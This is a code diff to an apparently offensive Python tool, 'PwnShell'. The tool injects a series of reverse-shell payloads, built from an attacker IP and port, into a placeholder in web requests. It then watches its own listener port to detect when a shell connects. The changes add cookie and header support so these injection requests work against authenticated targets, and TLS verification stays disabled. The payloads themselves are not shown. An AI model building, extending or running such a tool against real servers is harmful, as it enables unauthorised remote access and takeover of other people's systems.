@@ -18,7 +18,7 @@ import time
 import socket
 import burpee
 from colors import Colors, ColorsSet
-
+import json
 
 class PwnShell:
     def __init__(self, args):
@@ -28,7 +28,8 @@ class PwnShell:
         self.port = args.port
         self.domain = args.url
         self.method = args.method
-        self.cookie = args.cookie
+        self.cookie = args.cookies
+        self.headers = args.headers
         self.data = args.data
         self.type = args.type
         self.file = args.file
@@ -128,6 +129,12 @@ class PwnShell:
                    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    'Content-Type': 'application/x-www-form-urlencoded'}
+        if self.headers:
+            headers = self.headers
+        if self.cookie:
+            cookie = json.loads(self.cookie)
+        else:
+            cookie = None
         if self.method.lower() == 'post':
             if self.data:
                 if self.payload_type.lower() == "encoded":
@@ -136,11 +143,11 @@ class PwnShell:
                     data_parsed = self.data.replace("PWNME", payload)
             else:
                 data_parsed = None
-            r = requests.post(self.url, headers=headers, cookies=self.cookie,
+            r = requests.post(self.url, headers=headers, cookies=cookie,
                               verify=False, data=data_parsed)
             time.sleep(2)
         else:
-            r = requests.get(self.url, cookies=self.cookie,
+            r = requests.get(self.url, headers=headers, cookies=cookie,
                              verify=False)
             time.sleep(2)
 
@@ -150,6 +157,10 @@ class PwnShell:
         print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
         payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
         is_encoded = self.payload_type.lower() == "encoded"
+        if self.cookie:
+            cookie = json.loads(self.cookie)
+        else:
+            cookie = None
         for payload in payloads:
             if self.connected:
                 return
@@ -179,13 +190,13 @@ class PwnShell:
                         post_data = post_data.replace("PWNME", payload)
                 else:
                     post_data = None
-                req = requests.post(self.url, headers=request, data=post_data, verify=False)
+                req = requests.post(self.url, headers=request, data=post_data, verify=False, cookies=cookie)
                 time.sleep(2)
                 if self.is_port_in_use():
                     break
 
             else:
-                req = requests.get(self.url, headers=request, verify=False)
+                req = requests.get(self.url, headers=request, verify=False, cookies=cookie)
                 time.sleep(2)
                 if self.is_port_in_use():
                     break
@@ -341,8 +352,8 @@ if __name__ == '__main__':
         parser.add_argument("-f", "--file", help='Request file')
         parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
         parser.add_argument("-d", "--data", help='Post data')
-        parser.add_argument("-c", "--cookie", help='Enter Cookie')
-        parser.add_argument("-k", "--header", help='Provide header')
+        parser.add_argument("-c", "--cookies", help='Enter Cookies')
+        parser.add_argument("-k", "--headers", help='Provide headers')
         parser.add_argument("-m", "--method", help='Request Method', default='POST')
         args = parser.parse_args()
         pwnshell = PwnShell(args)
